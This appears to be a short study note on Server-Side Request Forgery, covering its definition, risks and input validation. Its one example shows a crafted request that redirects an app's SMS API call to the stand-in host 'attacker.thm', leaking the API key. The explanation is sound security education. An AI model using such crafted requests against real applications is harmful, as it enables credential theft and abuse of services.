### Server-Side Request Forgery (SSRF)

-> It is basically when attacker uses the request of the server to access or trick to access the internal resources with the previlage of the server.


**Definition:**  
SSRF is a type of vulnerability that allows an attacker to manipulate a web application into sending requests on their behalf to any destination. This can happen when the application interacts with external services.

**Example:**  
Imagine a web application that sends SMS notifications via an external API. The application requires an API key for authentication. If the app allows users to specify the API server in the request, an attacker could change the server parameter to a server they control.

- **Request from Attacker:**  
  ```
  https://www.mysite.com/sms?server=attacker.thm&msg=ABC
  ```

- **Resulting Request Sent by the App:**  
  ```
  https://attacker.thm/api/send?msg=ABC
  ```

In this case, the attacker receives the API key and can send SMS messages at the application's expense.

**Potential Risks of SSRF:**
1. **Network Enumeration:** Discover internal IP addresses and services.
2. **Access to Restricted Services:** Exploit trust relationships between servers to access protected services.
3. **Remote Code Execution (RCE):** Interact with non-HTTP services to execute code remotely.

**Conclusion:**  
SSRF can have serious implications, allowing attackers to exploit trust relationships and gain access to sensitive information or services. Always validate and sanitize user inputs to prevent SSRF vulnerabilities.

